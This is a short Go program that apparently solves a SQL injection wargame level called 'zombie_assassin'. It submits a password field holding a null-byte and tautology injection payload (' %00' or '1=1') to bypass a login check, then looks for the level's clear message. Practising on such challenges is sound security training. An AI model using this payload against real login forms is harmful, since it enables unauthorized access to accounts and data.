package problem

import(
	"fmt"
	"strings"
)

func Zombie_assassin(session string){
	file := "zombie_assassin_eb9c4ab86b8c26748f3ce3e91dcd4dd8.php"
	
	param := map[string]string{
		"id" : "admin",
		"pw" : " %00' or '1=1",
	}
	
	contents := connect(file, param, session)
	if strings.Contains(string(contents),"ZOMBIE_ASSASSIN Clear!"){
		fmt.Println("ZOMBIE_ASSASSIN Clear!")
	}
}